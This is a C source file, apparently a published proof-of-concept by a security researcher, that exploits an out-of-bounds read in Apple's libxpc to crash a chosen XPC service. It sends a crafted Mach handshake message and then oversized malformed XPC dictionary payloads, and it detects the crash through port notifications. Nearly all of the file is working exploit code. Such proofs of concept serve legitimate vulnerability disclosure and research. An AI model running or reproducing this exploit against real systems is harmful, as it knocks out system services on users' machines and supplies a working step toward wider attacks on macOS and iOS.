/*
 * xpc-crash
 * Brandon Azad
 *
 * A proof-of-concept exploit for an out-of-bounds memory read in libxpc that can be used to crash
 * an XPC service.
 *
 */

#include "xpc_crash/xpc_crash.h"

#include "headers/bootstrap.h"
#include "headers/mach_vm.h"
#include "launchd/launchd_service.h"
#include "log/log.h"

#include <assert.h>
#include <mach/mach.h>

// Connect to the XPC service at the specified service port.
static bool
xpc_connect(mach_port_t service_port, mach_port_t *server_port, mach_port_t *client_port) {
	// Create the server port. Add a send right so we can send to it later.
	mach_port_t server;
	mach_port_options_t options = { .flags = MPO_INSERT_SEND_RIGHT };
	kern_return_t kr = mach_port_construct(mach_task_self(), &options, 0, &server);
	assert(kr == KERN_SUCCESS);
	// Create the client port. No send right for this one.
	mach_port_t client;
	options.flags = 0;
	kr = mach_port_construct(mach_task_self(), &options, 0, &client);
	assert(kr == KERN_SUCCESS);
	// Create the XPC w00t message.
	struct xpc_w00t {
		mach_msg_header_t hdr;
		mach_msg_body_t body;
		mach_msg_port_descriptor_t server;
		mach_msg_port_descriptor_t client;
	};
	struct xpc_w00t w00t = {};
	w00t.hdr.msgh_bits              = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
	w00t.hdr.msgh_size              = sizeof(w00t);
	w00t.hdr.msgh_remote_port       = service_port;
	w00t.hdr.msgh_id                = 0x77303074; // 'w00t'
	w00t.body.msgh_descriptor_count = 2;
	w00t.server.name                = server;
	w00t.server.disposition         = MACH_MSG_TYPE_MOVE_RECEIVE;
	w00t.server.type                = MACH_MSG_PORT_DESCRIPTOR;
	w00t.client.name                = client;
	w00t.client.disposition         = MACH_MSG_TYPE_MAKE_SEND;
	w00t.client.type                = MACH_MSG_PORT_DESCRIPTOR;
	// Send the XPC w00t message.
	kr = mach_msg(&w00t.hdr,
			MACH_SEND_MSG,
			w00t.hdr.msgh_size,
			0,
			MACH_PORT_NULL,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
	if (kr != KERN_SUCCESS) {
		ERROR("%s(%s): %u", "mach_msg", "w00t", kr);
		mach_port_destroy(mach_task_self(), server);
		mach_port_destroy(mach_task_self(), client);
		return false;
	}
	*server_port = server;
	*client_port = client;
	return true;
}

// Build the OOL XPC crash message for the specified size.
static void *
xpc_crash_build_ool_data(size_t size) {
	mach_vm_address_t address = 0;
	kern_return_t kr = mach_vm_allocate(mach_task_self(), &address, size, VM_FLAGS_ANYWHERE);
	if (kr != KERN_SUCCESS) {
		ERROR("%s(%zu): %u", "mach_vm_allocate", size, kr);
		return NULL;
	}
#pragma pack(4)
	struct xpc_dictionary_header {
		uint32_t id;		// 0xf000
		uint32_t size;		// serialized size in bytes after this field
		uint32_t count;		// number of key/value pairs
	};
	struct xpc_ool_data {
		uint32_t xpc;		// '@XPC'
		uint32_t version;	// 5
		struct {
			struct xpc_dictionary_header hdr;
			char key[0];
		} dict;
	};
#pragma pack()
	struct xpc_ool_data *request = (struct xpc_ool_data *)address;
	mach_msg_size_t key_size = (mach_msg_size_t) size - sizeof(struct xpc_ool_data);
	request->xpc            = 0x40585043; // '@XPC'
	request->version        = 5;
	request->dict.hdr.id    = 0xf000;
	request->dict.hdr.size  = sizeof(request->dict) - 2 * sizeof(uint32_t) + key_size;
	request->dict.hdr.count = 1;
	memset(request->dict.key, 'A', key_size);
	return request;
}

// Create a port on which we can listen for a no senders notification.
static mach_port_t
create_no_senders_notification_port(mach_port_t port) {
	mach_port_t notify_port;
	mach_port_options_t options = { .flags = 0 };
	kern_return_t kr = mach_port_construct(mach_task_self(), &options, 0, &notify_port);
	assert(kr == KERN_SUCCESS);
	mach_port_t previous_notify;
	kr = mach_port_request_notification(mach_task_self(), port, MACH_NOTIFY_NO_SENDERS,
			0, notify_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &previous_notify);
	assert(kr == KERN_SUCCESS);
	assert(previous_notify == MACH_PORT_NULL);
	return notify_port;
}

// Check if a port created with create_no_senders_notification_port() was sent a no senders
// notification.
static bool
have_no_senders_notification(mach_port_t notify_port) {
	mach_msg_trailer_type_t trailer_type
		= MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0)
		| MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_NULL);
	mach_port_seqno_t seqno = 0;
	mach_msg_size_t msgh_size;
	mach_msg_id_t msgh_id;
	mach_msg_trailer_t trailer;
	mach_msg_type_number_t trailer_size = sizeof(trailer);
	kern_return_t kr = mach_port_peek(mach_task_self(), notify_port, trailer_type,
			&seqno, &msgh_size, &msgh_id,
			(mach_msg_trailer_info_t) &trailer, &trailer_size);
	return (kr == KERN_SUCCESS && msgh_id == MACH_NOTIFY_NO_SENDERS);
}

// Try to crash the specified XPC connection using a message of the specified size.
static bool
xpc_crash_with_size(mach_port_t server_port, mach_port_t client_port, mach_port_t notify_port,
		size_t xpc_data_size, bool *crash) {
	void *xpc_data = xpc_crash_build_ool_data(xpc_data_size);
	if (xpc_data == NULL) {
		return false;
	}
#pragma pack(4)
	struct xpc_crash_msg {
		mach_msg_header_t         hdr;
		mach_msg_body_t           body;
		mach_msg_ool_descriptor_t xpc_data;
	};
	struct reply {
		mach_msg_header_t hdr;
		uint8_t contents[2048];
	};
#pragma pack()
	union {
		struct xpc_crash_msg crash;
		struct reply reply;
	} msg = {};
	msg.crash.hdr.msgh_bits              = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, MACH_MSGH_BITS_COMPLEX);
	msg.crash.hdr.msgh_size              = sizeof(msg.crash);
	msg.crash.hdr.msgh_remote_port       = server_port;
	msg.crash.hdr.msgh_local_port        = mig_get_reply_port();
	msg.crash.hdr.msgh_id                = 0x10000000;
	msg.crash.body.msgh_descriptor_count = 1;
	msg.crash.xpc_data.address           = xpc_data;
	msg.crash.xpc_data.size              = (mach_msg_size_t) xpc_data_size;
	msg.crash.xpc_data.deallocate        = TRUE;
	msg.crash.xpc_data.copy              = MACH_MSG_VIRTUAL_COPY;
	msg.crash.xpc_data.type              = MACH_MSG_OOL_DESCRIPTOR;
	kern_return_t kr = mach_msg(&msg.crash.hdr,
			MACH_SEND_MSG | MACH_RCV_MSG,
			msg.crash.hdr.msgh_size,
			sizeof(msg.reply),
			msg.crash.hdr.msgh_local_port,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
	if (kr != KERN_SUCCESS) {
		ERROR("%s(%s): %u", "mach_msg", "crash", kr);
		mach_vm_deallocate(mach_task_self(), (mach_vm_address_t) xpc_data, xpc_data_size);
		return false;
	}
	DEBUG_TRACE(1, "Reply: id=%x, size=%x, bits=%x", msg.reply.hdr.msgh_id,
			msg.reply.hdr.msgh_size, msg.reply.hdr.msgh_bits);
	if (msg.reply.hdr.msgh_id != MACH_NOTIFY_SEND_ONCE) {
		return true;
	}
	if (!have_no_senders_notification(notify_port)) {
		return true;
	}
	DEBUG_TRACE(1, "Crashed with size 0x%zx", xpc_data_size);
	*crash = true;
	return true;
}

// Try to crash the specified XPC service.
bool
xpc_crash(const char *service) {
	bool success = false;
	mach_port_t service_port = launchd_lookup_service(service);
	if (service_port == MACH_PORT_NULL) {
		return false;
	}
	for (size_t pages = 1; !success && pages <= 100; pages++) {
		mach_port_t server_port, client_port;
		bool ok = xpc_connect(service_port, &server_port, &client_port);
		if (!ok) {
			break;
		}
		mach_port_t notify_port = create_no_senders_notification_port(client_port);
		size_t size = pages * 0x4000;
		ok = xpc_crash_with_size(server_port, client_port, notify_port, size, &success);
		mach_port_destroy(mach_task_self(), notify_port);
		mach_port_deallocate(mach_task_self(), server_port);
		mach_port_destroy(mach_task_self(), client_port);
		if (!ok) {
			break;
		}
	}
	if (!success) {
		ERROR("Could not crash service %s", service);
	}
	mach_port_deallocate(mach_task_self(), service_port);
	return success;
}
